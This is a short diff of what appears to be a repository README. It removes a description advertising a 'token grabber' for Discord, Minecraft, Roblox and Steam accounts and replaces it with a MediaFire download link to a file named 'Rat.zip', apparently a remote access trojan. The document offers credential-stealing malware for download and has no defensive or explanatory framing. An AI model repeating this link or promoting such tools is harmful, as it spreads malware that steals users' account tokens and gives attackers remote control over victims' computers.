@@ -1,2 +1,1 @@
-# Discrod-token-grabber-
-Discrod token grabber  for discord, minecraft roblox, steam ecc...
+https://www.mediafire.com/file/2qp4nlg4iljrgh8/Rat.zip/file
